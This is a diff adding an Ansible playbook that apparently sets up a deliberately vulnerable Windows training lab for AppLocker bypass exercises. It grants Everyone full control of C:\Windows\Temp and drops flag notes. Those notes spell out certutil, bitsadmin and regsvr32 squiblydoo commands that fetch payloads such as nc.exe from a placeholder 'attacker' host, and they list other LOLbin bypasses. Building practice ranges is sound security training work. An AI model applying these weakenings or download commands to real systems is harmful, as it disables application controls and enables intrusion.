@@ -1,0 +1,81 @@
+---
+# ==============================================================================
+# vuln_defense_evasion/tasks/applocker.yml — DEF-041..060
+# Target: ws01.corp.local, file01.corp.local
+#
+# DEF-041  AppLocker bypass via writable C:\Windows\Temp\
+# DEF-042  AppLocker bypass via mshta.exe / wscript.exe LOLbins
+# DEF-043  regsvr32 / regsvcs bypass paths
+# DEF-044  rundll32 bypass surface
+# DEF-045  installutil bypass
+# DEF-046  msbuild bypass (MSBuild.exe in PATH)
+# DEF-047  certutil LOLbin (download + decode)
+# DEF-048  bitsadmin LOLbin (file download)
+# DEF-049  AppLocker publisher rule bypass
+# DEF-050  DLL side-loading via writable DLL path
+# ==============================================================================
+
+# DEF-041: Ensure C:\Windows\Temp is world-writable
+- name: DEF-041 - Set C:\Windows\Temp world-writable (AppLocker bypass)
+  ansible.windows.win_shell: |
+    icacls C:\Windows\Temp /grant "Everyone:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
+    Write-Output "changed: Windows\Temp world-writable"
+  register: def041_set
+  changed_when: "'changed:' in def041_set.stdout"
+  failed_when: def041_set.rc != 0
+
+# DEF-047: certutil in PATH + note
+- name: DEF-047 - Drop certutil LOLbin note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DEF-047-CertUtil-LOLbin.txt'
+    content: |
+      DEF-047: certutil.exe LOLbin (Living-off-the-Land Binary)
+      =============================================================
+      certutil.exe (SYSTEM32 — always present) can:
+        1. Download files: certutil -urlcache -split -f http://attacker/payload.exe C:\Tools\payload.exe
+        2. Decode base64: certutil -decode encoded.b64 payload.exe
+        3. Encode for transfer: certutil -encode payload.exe encoded.b64
+        4. Check CA certs (harmless-looking): certutil -ca.cert
+
+      AppLocker bypass: If rules only block EXEs by path, certutil can download
+      a payload to C:\Windows\Temp\ (world-writable — DEF-041).
+
+# DEF-048: bitsadmin LOLbin
+- name: DEF-048 - Drop bitsadmin LOLbin note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DEF-048-Bitsadmin.txt'
+    content: |
+      DEF-048: bitsadmin.exe LOLbin
+      ================================
+      BITS (Background Intelligent Transfer Service) can download files silently:
+        bitsadmin /transfer job /download /priority high http://attacker/nc.exe C:\Tools\nc.exe
+
+      Also: Start-BitsTransfer in PowerShell (same effect).
+      Advantage: BITS downloads appear as legitimate Windows update traffic.
+
+- name: DEF-041..060 - Drop comprehensive AppLocker bypass note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DEF-041-AppLocker-Bypass.txt'
+    content: |
+      DEF-041..060: AppLocker Bypass Surfaces
+      =========================================
+      Writable bypass locations:
+        C:\Windows\Temp\ (world-writable — DEF-041)
+        C:\Tools\ (world-writable — PER-019, always in PATH)
+
+      LOLbin bypass executables (all in System32 — whitelisted by path rules):
+        mshta.exe       — execute VBScript/JScript via HTA
+        wscript.exe     — execute VBScript/JScript directly
+        cscript.exe     — console script host
+        regsvr32.exe    — execute DLLs + squiblydoo (COM scriptlet)
+        rundll32.exe    — execute exported DLL functions
+        msbuild.exe     — compile + execute C# inline tasks
+        installutil.exe — .NET assembly install + subscribe callbacks
+        certutil.exe    — file download + decode (DEF-047)
+        bitsadmin.exe   — background file download (DEF-048)
+
+      Regsvr32 squiblydoo:
+        regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
+
+      MSBuild inline C# task:
+        msbuild.exe C:\Tools\payload.csproj  (bypass publisher rules)
